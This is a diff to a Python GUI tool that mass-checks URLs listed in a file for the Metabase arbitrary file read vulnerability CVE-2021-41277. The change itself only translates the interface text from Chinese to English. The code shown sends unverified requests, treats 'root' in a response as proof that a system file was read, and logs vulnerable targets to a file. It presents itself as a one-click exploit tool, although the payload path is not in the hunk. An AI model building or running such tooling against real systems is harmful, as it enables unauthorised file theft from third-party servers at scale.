@@ -11,25 +11,25 @@ def metabase_readfile_exp(url):
     try:
         res = requests.get(url, verify=False, timeout=3)
         if "root" in res.text:
-            metabase_readfile_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
+            metabase_readfile_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:" + url + "\n")
             metabase_readfile_text.see(END)
-            with open ("存在MetaBase任意文件读取漏洞(CVE-2021-41277)的url.txt", 'a') as f:
+            with open ("[exists]metabase_readfile_CVE_2021_41277_url.txt", 'a') as f:
                 f.write(url + "\n")
         else:
-            metabase_readfile_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
+            metabase_readfile_text.insert(END,"[×]URL without vulnerability:" + url + "\n")
             metabase_readfile_text.see(END)
     except Exception as err:
-        metabase_readfile_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
+        metabase_readfile_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
         metabase_readfile_text.see(END)
 def get_metabase_readfile_addr():
-    with open("修正后的url.txt","r") as f:
+    with open("corrected url.txt","r") as f:
         for address in f.readlines():
             address = address.strip()
             yield address
 def metabase_readfile_gui():
     metabase_readfile = Toplevel()
     metabase_readfile.geometry("1035x455")
-    metabase_readfile.title("MetaBase任意文件读取漏洞(CVE-2021-41277)一把梭")
+    metabase_readfile.title("MetaBase arbitrary file read(CVE-2021-41277) [auto-muti-exp]")
     metabase_readfile.resizable(0, 0)
     logo = PhotoImage(file="./logo.ico")
     metabase_readfile.tk.call('wm', 'iconphoto', metabase_readfile._w, logo)
